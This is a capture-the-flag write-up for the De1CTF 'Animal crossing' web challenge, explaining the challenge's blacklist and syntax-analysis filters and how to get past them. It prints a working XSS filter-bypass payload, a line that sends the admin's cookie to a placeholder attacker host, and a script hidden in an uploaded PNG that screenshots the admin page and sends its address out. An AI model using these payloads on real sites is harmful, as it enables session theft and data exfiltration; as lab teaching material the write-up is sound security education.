# Animal crossing write up

Description:
Free passport creator lets you show your island!



## Level 1: bypass the cloud WAF

Cloud WAF usually has several layers and several filtering methods. Here I also designed two layers of protection.

### Layer 1: Blacklist detection

```go
var blackList = []string{
	//global
	"document", "window", "top", "parent", "global", "this",
	//func
	"console", "alert", "log", "promise", "fetch", "eval", "import",
	//char
	"<", ">", "`", "\\*", "&", "#", "%", "\\\\",
	//key
	"if", "set", "get", "with", "yield", "async", "wait", "func", "for", "error", "string",
	//string
	"href", "location", "url", "cookie", "src",
}
```

The way to bypass the blacklist is to avoid the strings and characters of ban. Here, because of the iris framework problem of go, the `;` and the data after it will be deleted, and can be bypassed with `%0a`

### Layer 2: Static syntax analysis

```
1. Pass in data to fmt.Sprintf("'%s';", data), and then parse the syntax. If parse fails, the error will be returned directly.
2. And then we visit AST nodes:
   1. VariableExpression/AssignExpression, All declaration/assignment statements will ban
   2. CallExpression, all function call, and callee not Identifier, will ban, example:
      1. ban:  test.test()、a[x]()
      2. pass: test()
   3. BracketExpression, all member reference and member is not Identifier, will ban, example:
      1. ban:  a[1]、a['xx']
      2. pass: a[x]
```

This layer of WAF, in fact, only needs to find out the rule of ban and find the unprocessed syntax to bypass it. My expected solution here is to pass variables with `throw`, but there are many other syntax that can be used.

The payload:

```js
data=base64DATAXXXXXXX'%0atry{throw 'ev'%2b'al'}catch(e){try{throw frames[e]}catch(c){c(atob(data))}}%0a//
```

After bypassing the two layers of WAF protection, the local successful alert, we can use:

```js
location.href = "http://xxxx/?" + btoa(ducument.cookie) 
```

get the admin cookie, and the cookie is a part of the flag:

```
FLAG=De1CTF{I_l1k4_
```



## Level 2: read 400 pictures

In the other half of the flag, hint:

```
What is the admin doing?
```

Read the administrator's document, you will find that there are  400 PNG images, and the flag is hidden in these images. 

Here are several solutions preset during the design:

1. Bypass CSP to import html2canvas lib, get the screenshot and upload to server, get the image address and send it back, then download the image
2. Use the for loop to send all 400 pictures to /upload, get 400 picture addresses and send back
3. Read the pictures directly and send them back one by one, write scripts, or use for to circulate and batch transfer, but the return process needs code conversion, and after the transfer back, it also needs to be converted into pictures for splicing

All three solutions can get the flag, I will introduce the solution of bypassing CSP and import html2canvas lib. Other methods are similar, so I won't write them all (You can go to see the players' writeup),

### Bypass CSP to import html2canvas lib

The main function of this website is to create a animal crossing passport, The homepage has a `/upload` api for upload image, you can upload a file with `png` suffix, and use `fetch` get the png file source, then `eval` it. You can bypass CSP to import the html2canvas lib and execute it. 

The png file:

```js
	...
  ...
html2canvas.js code
	...
  ...

// screenshot->upload screenshot->send img address back
html2canvas(document.body).then(function(canvas) {
        const form = new FormData(),
        url = "/upload",
        blob = new Blob([canvas.toDataURL().toString()], {type : "image/png"})
        file = new File([blob], "a.png")
        form.append("file", file)
        fetch(url, {
            method: "POST",
            body: form
        }).then(function(response) {
            return response.json()
        }).then(function(data) {
            location.href="//xxxxxxxxx:8099/?"+data.data.toString()
        })
  })
```

Here I also write the JS of screenshot operation into png. 

It upload the screenshot to the server and get the returned image address, then send it back to the attacker

### Read image and execute

After upload the image, get the png address, then you can read the image with the controllable JS part and execute it

```js
fetch(`/static/images/xxxxxxxxx.png`).then(res=>res.text()).then(txt=>eval(txt))
```

And you can use the method of bypassing the WAF to pack it



Finally, when submitted to the BOT, you can receive the address of the screenshot of the admin's interface, and download it to see the other half of the flag

```
cool_GamE}
```

Flag:

```
De1CTF{I_l1k4_cool_GamE}
```


